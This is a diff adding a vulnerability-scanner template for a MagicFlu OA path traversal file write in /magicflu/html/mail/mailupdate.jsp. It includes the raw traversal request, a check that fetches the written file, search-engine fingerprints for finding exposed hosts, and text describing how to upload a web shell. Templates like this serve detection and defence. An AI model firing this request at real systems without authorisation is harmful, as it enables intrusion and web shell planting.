@@ -1,0 +1,37 @@
+id: magicflu-mailupdate-jsp-fileupload
+
+info:
+  name: magicflu-mailupdate-jsp-fileupload
+  author: hufei
+  severity: critical
+  reference:
+    - https://www.magicflu.com/
+    - An attacker can exploit this vulnerability by sending a crafted HTTP request to the '/magicflu/html/mail/mailupdate.jsp' endpoint, manipulating the 'messageid' parameter to traverse directories and upload a malicious file (e.g., a web shell) with a randomized filename. Subsequently, the attacker can validate the successful upload by sending a request to the '/magicflu/{{name}}.txt' endpoint, where {{name}} is the randomly generated filename.
+  metadata:
+    fofa-query: icon_hash="694014318"
+    hunter-query: web.icon=="7cdc7033cbe79069de1d5d096a6d721c"
+    veified: true
+  tags: magicflu,oa,fileupload
+
+variables:
+  name: '{{rand_base(5)}}'
+  data: '{{rand_base(5)}}'
+
+http:
+  - raw:
+      - | # upload file
+        GET /magicflu/html/mail/mailupdate.jsp?messageid=/../../../{{name}}.txt&messagecontent={{data}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Moziilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
+
+      - | # validate
+        GET /magicflu/{{name}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Moziilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200"
+          - "status_code_2 == 200 && contains((body_2), '{{data}}')"
+        condition: and
